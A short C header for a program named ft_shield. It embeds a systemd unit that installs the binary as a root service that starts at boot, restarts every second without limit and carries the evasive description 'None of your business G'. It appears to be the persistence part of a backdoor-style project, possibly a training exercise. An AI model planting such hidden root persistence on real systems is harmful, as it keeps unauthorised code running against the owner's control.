#ifndef SHIELD_H
#define SHIELD_H

#include <stdio.h>

#define SYSTEMD_CONFIG_PATH "/etc/systemd/system/ft_shield.service"

#define SYSTEMD_CONFIG                                                                                                                                         \
    "[Unit]\n"                                                                                                                                                 \
    "Description=None of your business G\n"                                                                                                                    \
    "After=network.target\n"                                                                                                                                   \
    "StartLimitIntervalSec=0\n\n"                                                                                                                              \
                                                                                                                                                               \
    "[Service]\n"                                                                                                                                              \
    "Type=simple\n"                                                                                                                                            \
    "Restart=always\n"                                                                                                                                         \
    "RestartSec=1\n"                                                                                                                                           \
    "User=root\n"                                                                                                                                              \
    "ExecStart=/bin/ft_shield\n\n"                                                                                                                             \
                                                                                                                                                               \
    "[Install]\n"                                                                                                                                              \
    "WantedBy=multi-user.target\n"

size_t __log(FILE *restrict __stream, const char *restrict __format, ...);

#endif
